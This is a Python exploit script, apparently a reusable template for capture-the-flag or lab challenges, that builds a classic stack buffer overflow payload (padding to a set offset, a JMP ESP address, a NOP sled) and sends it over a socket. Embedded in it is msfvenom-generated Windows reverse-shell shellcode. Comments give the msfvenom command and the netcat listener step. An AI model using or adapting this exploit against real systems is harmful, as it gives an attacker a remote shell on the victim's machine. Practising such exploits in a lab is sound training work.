#!/usr/bin/env python3

import socket
import struct

def p32(data):
	return struct.pack('<I', data)

## set host_ip and port here

host, port = '123.456.789.1', 123456

all_chars = bytearray(range(1,256))

bad_chars = [
	## add found bad characters here like - b"\x00",
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")

command = b""
lenght = 5000
offset = 1978 ## change this, cause it will change every challenge
jmp_esp = p32(0x625011AF)

## msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=123456 -b $bad_chars -f py -v shellcode
## this will gonna execute a reverse shell ... so do already place a listener with nc -lvnp and you're assigned port

shellcode =  b""
shellcode += b"\xdb\xca\xbb\x39\xda\xe1\x39\xd9\x74\x24\xf4"
shellcode += b"\x5d\x2b\xc9\xb1\x52\x31\x5d\x17\x03\x5d\x17"
shellcode += b"\x83\xfc\xde\x03\xcc\x02\x36\x41\x2f\xfa\xc7"
shellcode += b"\x26\xb9\x1f\xf6\x66\xdd\x54\xa9\x56\x95\x38"
shellcode += b"\x46\x1c\xfb\xa8\xdd\x50\xd4\xdf\x56\xde\x02"
shellcode += b"\xee\x67\x73\x76\x71\xe4\x8e\xab\x51\xd5\x40"
shellcode += b"\xbe\x90\x12\xbc\x33\xc0\xcb\xca\xe6\xf4\x78"
shellcode += b"\x86\x3a\x7f\x32\x06\x3b\x9c\x83\x29\x6a\x33"
shellcode += b"\x9f\x73\xac\xb2\x4c\x08\xe5\xac\x91\x35\xbf"
shellcode += b"\x47\x61\xc1\x3e\x81\xbb\x2a\xec\xec\x73\xd9"
shellcode += b"\xec\x29\xb3\x02\x9b\x43\xc7\xbf\x9c\x90\xb5"
shellcode += b"\x1b\x28\x02\x1d\xef\x8a\xee\x9f\x3c\x4c\x65"
shellcode += b"\x93\x89\x1a\x21\xb0\x0c\xce\x5a\xcc\x85\xf1"
shellcode += b"\x8c\x44\xdd\xd5\x08\x0c\x85\x74\x09\xe8\x68"
shellcode += b"\x88\x49\x53\xd4\x2c\x02\x7e\x01\x5d\x49\x17"
shellcode += b"\xe6\x6c\x71\xe7\x60\xe6\x02\xd5\x2f\x5c\x8c"
shellcode += b"\x55\xa7\x7a\x4b\x99\x92\x3b\xc3\x64\x1d\x3c"
shellcode += b"\xca\xa2\x49\x6c\x64\x02\xf2\xe7\x74\xab\x27"
shellcode += b"\xa7\x24\x03\x98\x08\x94\xe3\x48\xe1\xfe\xeb"
shellcode += b"\xb7\x11\x01\x26\xd0\xb8\xf8\xa1\xd5\x34\xff"
shellcode += b"\x8b\x82\x46\xff\xc8\x7b\xce\x19\x64\x6c\x86"
shellcode += b"\xb2\x11\x15\x83\x48\x83\xda\x19\x35\x83\x51"
shellcode += b"\xae\xca\x4a\x92\xdb\xd8\x3b\x52\x96\x82\xea"
shellcode += b"\x6d\x0c\xaa\x71\xff\xcb\x2a\xff\x1c\x44\x7d"
shellcode += b"\xa8\xd3\x9d\xeb\x44\x4d\x34\x09\x95\x0b\x7f"
shellcode += b"\x89\x42\xe8\x7e\x10\x06\x54\xa5\x02\xde\x55"
shellcode += b"\xe1\x76\x8e\x03\xbf\x20\x68\xfa\x71\x9a\x22"
shellcode += b"\x51\xd8\x4a\xb2\x99\xdb\x0c\xbb\xf7\xad\xf0"
shellcode += b"\x0a\xae\xeb\x0f\xa2\x26\xfc\x68\xde\xd6\x03"
shellcode += b"\xa3\x5a\xe6\x49\xe9\xcb\x6f\x14\x78\x4e\xf2"
shellcode += b"\xa7\x57\x8d\x0b\x24\x5d\x6e\xe8\x34\x14\x6b"
shellcode += b"\xb4\xf2\xc5\x01\xa5\x96\xe9\xb6\xc6\xb2"

## just cruising down the road ... with many nop's

nop_sled = b"\x90" * 24

payload = b"".join(
	[
	command,
	#b""
	b"A" * offset,
	jmp_esp,
	nop_sled,
	shellcode,
	b"C" * (lenght - len(jmp_esp) - offset - len (nop_sled) - len(shellcode)),
	]
)

with socket.socket() as s:
	s.connect((host, port))

	print(s.recv(4096))
	#banner = s.resv(4096).decode("utf-8").strip()
	s.send(payload)
